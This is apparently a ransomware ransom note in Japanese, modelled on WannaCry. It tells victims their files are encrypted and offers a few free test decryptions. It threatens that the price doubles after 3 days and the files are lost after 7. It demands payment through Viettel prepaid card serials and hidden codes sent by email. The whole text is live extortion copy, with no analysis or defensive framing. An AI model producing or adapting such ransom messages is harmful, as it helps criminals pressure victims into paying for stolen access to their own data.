私のコンピュータはどうなりますか？
重要なファイルは暗号化されています
文書、写真、ビデオ、データベース、およびその他のファイルの多くは、暗号化されているためアクセスできなくなりました。ファイルを回復する方法を探しているかもしれませんが、時間を無駄にすることはありません。誰も私たちの解読サービスなしであなたのファイルを回復することはできません

ファイルを回復できますか？
確かに、すべてのファイルを安全かつ簡単に復元できることを保証できます。しかし、あなたはあまり時間がありません。
いくつかのファイルを無料で解読することができます。 <decrypt>をクリックして、
しかし、すべてのファイルを復号化したい場合は、支払う必要があります。
お支払いを送信するのに3日しかかかりません。その後、価格は2倍になります。
また、7日以内に支払いをしないと、ファイルを永久に回復することができなくなります。
6か月以内に払うことができないほど貧しいユーザーに対しては、無料イベントを開催します。

どのように支払うのですか？
送信ボタンをクリックし、最初のフィールドにメールアドレスを入力します。
暗号化コードとViettelシリアルとコードをこの形式のように送信する必要があります
----- Send Example ----- 

Encrypt Code: *****-*****-*****-*****-***** (25 digit)
Serial: (Vietel Serial code)
Hidden Code: (Vietel Hidden Code)

------------------------

数日後、電子メールに添付されている解読コードを電子メールで受け取ることになります。 それを開き、暗号化コードを入力します。

[コードを解読する]フィールドにコードを貼り付けると、ファイルは無料です。:D